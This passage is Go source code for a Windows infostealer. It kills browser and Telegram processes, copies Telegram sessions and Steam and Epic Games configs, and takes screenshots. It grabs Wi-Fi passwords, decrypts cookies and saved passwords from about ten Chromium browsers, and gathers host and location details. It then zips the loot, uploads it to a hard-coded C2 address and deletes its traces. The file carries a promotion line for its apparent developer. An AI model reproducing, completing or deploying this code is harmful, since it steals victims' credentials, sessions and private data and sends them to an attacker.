	infoContent.WriteString("▢ CPU Frequency: Not easily available in Go standard lib.\n")

	memInfo, err := mem.VirtualMemory()
	if err != nil {
		debugPrint(fmt.Sprintf("Error getting memory info: %v", err))
		infoContent.WriteString("▢ Total Memory: Error\n")
		infoContent.WriteString("▢ Available Memory: Error\n")
		infoContent.WriteString("▢ Used Memory: Error\n")
	} else {
		infoContent.WriteString(fmt.Sprintf("▢ Total Memory: %.2f GB\n", float64(memInfo.Total)/(1024*1024*1024)))
		infoContent.WriteString(fmt.Sprintf("▢ Available Memory: %.2f GB\n", float64(memInfo.Available)/(1024*1024*1024)))
		infoContent.WriteString(fmt.Sprintf("▢ Used Memory: %.2f GB\n", float64(memInfo.Used)/(1024*1024*1024)))
	}

	infoContent.WriteString("▢ Disk Space:\n")
	partitions, err := disk.Partitions(false)
	if err != nil {
		debugPrint(fmt.Sprintf("Error getting disk partitions: %v", err))
		infoContent.WriteString("  - Error getting disk info.\n")
	} else {
		for _, p := range partitions {
			usage, err := disk.Usage(p.Mountpoint)
			if err != nil {
				debugPrint(fmt.Sprintf("Error getting disk usage for %s: %v", p.Mountpoint, err))
				continue
			}
			infoContent.WriteString(fmt.Sprintf("  - Disk %s: Total %.2f GB, Free %.2f GB\n",
				p.Mountpoint, float64(usage.Total)/(1024*1024*1024), float64(usage.Free)/(1024*1024*1024)))
		}
	}

	macAddress := getMACAddress()
	ipAddress := getLocalIPAddress()
	currentUser, err := user.Current()
	username := "Unknown"
	if err == nil {
		username = currentUser.Username
	} else {
		username = os.Getenv("USERNAME")
	}

	computerName, err := os.Hostname()
	if err != nil {
		computerName = "Unknown"
	}

	ssid, bssid := getNetworkInfo()

	locationData := getLocationByIP(publicIP)

	infoContent.WriteString("▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃\n")
	infoContent.WriteString(fmt.Sprintf("▪ MAC Address: %s\n", macAddress))
	infoContent.WriteString(fmt.Sprintf("▪ IP Address: %s\n", ipAddress))
	infoContent.WriteString(fmt.Sprintf("▪ Username: %s\n", username))
	infoContent.WriteString(fmt.Sprintf("▪ Computer Name: %s\n", computerName))
	infoContent.WriteString(fmt.Sprintf("▪ Public IP: %s\n", publicIP))
	infoContent.WriteString(fmt.Sprintf("▪ SSID: %s\n", ssid))
	infoContent.WriteString(fmt.Sprintf("▪ BSSID: %s\n", bssid))
	infoContent.WriteString(fmt.Sprintf("▪ Location: %s\n", locationData.FullLocationString))
	infoContent.WriteString("▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃\n")
	infoContent.WriteString("Subscribe to the developer: @Rigolit22\n")
	infoContent.WriteString("▪▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️\n")

	return infoContent.String(), locationData.Latitude, locationData.Longitude
}

func zipFolder(sourceFolder string, outputZipPath string) error {
	debugPrint(fmt.Sprintf("Starting zip creation for folder: %s to %s", sourceFolder, outputZipPath))
	newZipFile, err := os.Create(outputZipPath)
	if err != nil {
		return fmt.Errorf("error creating zip file %s: %w", outputZipPath, err)
	}
	defer newZipFile.Close()

	zipWriter := zip.NewWriter(newZipFile)
	defer zipWriter.Close()

	err = filepath.Walk(sourceFolder, func(filePath string, info os.FileInfo, err error) error {
		if err != nil {
			debugPrint(fmt.Sprintf("Error walking path for zip %s: %v", filePath, err))
			return nil
		}

		relPath, err := filepath.Rel(sourceFolder, filePath)
		if err != nil {
			return fmt.Errorf("error getting relative path for %s: %w", filePath, err)
		}
		if relPath == "." {
			return nil
		}

		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return fmt.Errorf("error creating file info header for %s: %w", filePath, err)
		}

		header.Name = filepath.ToSlash(relPath)
		if info.IsDir() {
			header.Name += "/"
		}

		writer, err := zipWriter.CreateHeader(header)
		if err != nil {
			return fmt.Errorf("error creating zip header for %s: %w", filePath, err)
		}

		if !info.IsDir() {
			file, err := os.Open(filePath)
			if err != nil {
				debugPrint(fmt.Sprintf("Error opening file %s for zip: %v", filePath, err))
				return nil
			}
			defer file.Close()
			_, err = io.Copy(writer, file)
			if err != nil {
				return fmt.Errorf("error copying file %s to zip: %w", filePath, err)
			}
		}
		return nil
	})

	if err != nil {
		return fmt.Errorf("error walking source folder %s for zip: %w", sourceFolder, err)
	}
	debugPrint(fmt.Sprintf("Successfully created zip file: %s", outputZipPath))
	return nil
}

func sendToC2Server(c2URL string, zipFilePath string, systemInfo string, latitude, longitude float64) error {
	debugPrint(fmt.Sprintf("Attempting to send data to C2 server: %s", c2URL))

	file, err := os.Open(zipFilePath)
	if err != nil {
		return fmt.Errorf("error opening zip file %s for sending: %w", zipFilePath, err)
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile("file", filepath.Base(zipFilePath))
	if err != nil {
		return fmt.Errorf("error creating form file for zip: %w", err)
	}
	_, err = io.Copy(part, file)
	if err != nil {
		return fmt.Errorf("error copying zip file to form: %w", err)
	}

	_ = writer.WriteField("system_info", systemInfo)
	_ = writer.WriteField("latitude", fmt.Sprintf("%f", latitude))
	_ = writer.WriteField("longitude", fmt.Sprintf("%f", longitude))

	writer.Close()

	req, err := http.NewRequest("POST", c2URL+"/upload", body)
	if err != nil {
		return fmt.Errorf("error creating C2 POST request: %w", err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{Timeout: 60 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("error sending data to C2 server: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		respBody, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("C2 server returned non-OK status %d: %s", resp.StatusCode, respBody)
	}

	debugPrint(fmt.Sprintf("Data successfully sent to C2 server. Response status: %s", resp.Status))
	return nil
}

func main() {
	userProfile := os.Getenv("USERPROFILE")
	if userProfile == "" {
		fmt.Println("Fatal error: USERPROFILE environment variable not set.")
		os.Exit(1)
	}
	destFolder := filepath.Join(userProfile, "Windows NB")

	rand.Seed(time.Now().UnixNano())

	if err := ensureDir(destFolder); err != nil {
		fmt.Printf("Fatal error creating destination folder %s: %v\n", destFolder, err)
		os.Exit(1)
	}

	logFilePath := filepath.Join(destFolder, "exfiltrator_log.txt")
	if err := setupLogger(logFilePath); err != nil {
		fmt.Printf("Fatal error setting up logger: %v\n", err)
		os.Exit(1)
	}
	defer func() {
		if logFile != nil {
			logFile.Close()
		}
	}()

	debugPrint(fmt.Sprintf("Starting exfiltrator. Destination folder: %s", destFolder))

	publicIP := getPublicIP()
	debugPrint(fmt.Sprintf("Identified Public IP: %s", publicIP))

	decryptedCookiesDir := filepath.Join(destFolder, "Decrypted_Cookies")
	browserHistoryDir := filepath.Join(destFolder, "BrowserHistory")
	telegramDataDir := filepath.Join(destFolder, "tdata")
	decryptedPasswordsDir := filepath.Join(destFolder, "Decrypted_Passwords")

	ensureDir(decryptedCookiesDir)
	debugPrint(fmt.Sprintf("Created cookies folder: %s", decryptedCookiesDir))
	ensureDir(browserHistoryDir)
	debugPrint(fmt.Sprintf("Created browser history folder: %s", browserHistoryDir))
	ensureDir(telegramDataDir)
	debugPrint(fmt.Sprintf("Created Telegram data folder: %s", telegramDataDir))
	ensureDir(decryptedPasswordsDir)
	debugPrint(fmt.Sprintf("Created passwords folder: %s", decryptedPasswordsDir))

	var wg sync.WaitGroup

	wg.Add(1)
	go killBrowserProcesses(&wg)
	wg.Wait()
	debugPrint("All browser processes terminated.")
	time.Sleep(500 * time.Millisecond)

	wg.Add(1)
	go killTelegramProcess(&wg)
	wg.Wait()
	debugPrint("All Telegram processes terminated.")
	time.Sleep(500 * time.Millisecond)

	wg.Add(1)
	go getWifiPasswords(destFolder, &wg)

	wg.Add(1)
	go searchAndExfiltrateFiles(destFolder, &wg)

	wg.Add(1)
	go copySteamConfig(destFolder, &wg)

	wg.Add(1)
	go copyEpicGamesConfig(destFolder, &wg)

	wg.Add(1)
	go takeScreenshot(destFolder, &wg)

	wg.Add(1)
	go getSystemInfo(destFolder, &wg)

	wg.Add(1)
	go copyTelegramSessionFiles(destFolder, &wg)
	wg.Add(1)
	go deleteTgFiles(destFolder, &wg)

	chromiumBrowsersForHistory := []string{
		"chrome", "edge", "yandex", "brave", "vivaldi", "slimjet", "iridium", "centbrowser", "opera", "opera_gx",
	}

	for _, browser := range chromiumBrowsersForHistory {
		wg.Add(1)
		go processBrowserProfilesForHistoryAndAutofill(browser, browserHistoryDir, &wg)
	}

	chromiumBrowsers := []string{
		"chrome", "edge", "opera", "opera_gx", "yandex", "brave",
		"vivaldi", "slimjet", "iridium", "centbrowser",
	}

	for _, browser := range chromiumBrowsers {
		wg.Add(1)
		go copyAndDecryptCookies(browser, decryptedCookiesDir, &wg)
	}

	for _, browser := range chromiumBrowsers {
		wg.Add(1)
		go func(b string) {
			defer wg.Done()
			masterKey, err := getBrowserMasterKey(b)
			if err != nil {
				debugPrint(fmt.Sprintf("Error getting master key for passwords for %s: %v", b, err))
				return
			}
			debugPrint(fmt.Sprintf("Master key for passwords for %s obtained. Length: %d", b, len(masterKey)))

			baseUserDataPath := ""
			switch b {
			case "chrome":
				baseUserDataPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
			case "edge":
				baseUserDataPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data")
			case "yandex":
				baseUserDataPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data")
			case "opera":
				baseUserDataPath = filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera Stable")
			case "opera_gx":
				baseUserDataPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "Opera Software", "Opera GX Stable")
			case "brave":
				baseUserDataPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data")
			case "vivaldi":
				baseUserDataPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "Vivaldi", "User Data")
			case "slimjet":
				baseUserDataPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "Slimjet", "User Data")
			case "iridium":
				baseUserDataPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "Iridium", "User Data")
			case "centbrowser":
				baseUserDataPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "CentBrowser", "User Data")
			default:
				debugPrint(fmt.Sprintf("Browser %s is not configured for password decryption in Go module.", b))
				return
			}

			if !pathExists(baseUserDataPath) {
				debugPrint(fmt.Sprintf("Base user data path not found for %s at path: %s", b, baseUserDataPath))
				return
			}
			debugPrint(fmt.Sprintf("Found base user data path for %s at path: %s", b, baseUserDataPath))

			var profilePaths []string
			if b == "opera" || b == "opera_gx" {
				profilePaths = append(profilePaths, baseUserDataPath)
			} else {
				entries, err := os.ReadDir(baseUserDataPath)
				if err != nil {
					debugPrint(fmt.Sprintf("Error reading user data directory for %s: %v", b, err))
					return
				}
				for _, entry := range entries {
					if entry.IsDir() && (strings.HasPrefix(entry.Name(), "Profile") || entry.Name() == "Default" || entry.Name() == "Guest Profile") {
						profilePaths = append(profilePaths, filepath.Join(baseUserDataPath, entry.Name()))
					}
				}
			}

			if len(profilePaths) == 0 {
				debugPrint(fmt.Sprintf("No profiles found for %s under %s", b, baseUserDataPath))
				return
			}
			debugPrint(fmt.Sprintf("Found %d profiles for %s: %v", len(profilePaths), b, profilePaths))

			var profilePwdWg sync.WaitGroup
			for _, pPath := range profilePaths {
				profilePwdWg.Add(1)
				go func(profPath string, browserNameForPwd string, key []byte, dest string) {
					defer profilePwdWg.Done()
					extractAndDecryptPasswords(browserNameForPwd, profPath, key, dest)
				}(pPath, b, masterKey, decryptedPasswordsDir)
			}
			profilePwdWg.Wait()
			debugPrint(fmt.Sprintf("Finished processing passwords for %s", b))
		}(browser)
	}

	wg.Add(1)
	go func() {
		defer wg.Done()
		PerformSimplePortScan("127.0.0.1", 1, 100, 500*time.Millisecond)
	}()

	wg.Wait()
	debugPrint("All exfiltrator tasks completed. Proceeding to C2 communication.")

	systemInfoForC2, latitude, longitude := getFormattedSystemInfoForC2(publicIP)

	wg.Add(1)
	go func() {
		defer wg.Done()
		PerformSimplePortScan("127.0.0.1", 1, 100, 500*time.Millisecond)
	}()

	wg.Wait()
	debugPrint("All exfiltrator tasks completed. Proceeding to C2 communication.")

	computerName, _ := os.Hostname()

	safeIP := strings.ReplaceAll(publicIP, ".", "_")
	safeComputerName := strings.ReplaceAll(computerName, " ", "_")
	safeComputerName = strings.ReplaceAll(safeComputerName, ".", "_")

	outputZipPath := filepath.Join(os.Getenv("USERPROFILE"), fmt.Sprintf("[%s]_[%s].zip", safeIP, safeComputerName))

	if err := zipFolder(destFolder, outputZipPath); err != nil {
		debugPrint(fmt.Sprintf("Fatal error zipping data: %v", err))
	} else {
		c2ServerURL := "http://147.45.45.122:8000"
		if err := sendToC2Server(c2ServerURL, outputZipPath, systemInfoForC2, latitude, longitude); err != nil {
			debugPrint(fmt.Sprintf("Fatal error sending data to C2: %v", err))
		} else {
			debugPrint("Data successfully sent to C2 server.")
			if err := os.RemoveAll(destFolder); err != nil {
				debugPrint(fmt.Sprintf("Error removing destination folder %s: %v", destFolder, err))
			} else {
				debugPrint(fmt.Sprintf("Removed destination folder: %s", destFolder))
			}
			if err := os.Remove(outputZipPath); err != nil {
				debugPrint(fmt.Sprintf("Error removing zip file %s: %v", outputZipPath, err))
			} else {
				debugPrint(fmt.Sprintf("Removed zip file: %s", outputZipPath))
			}
		}
	}
	debugPrint("All exfiltrator operations finished. Exiting.")
}
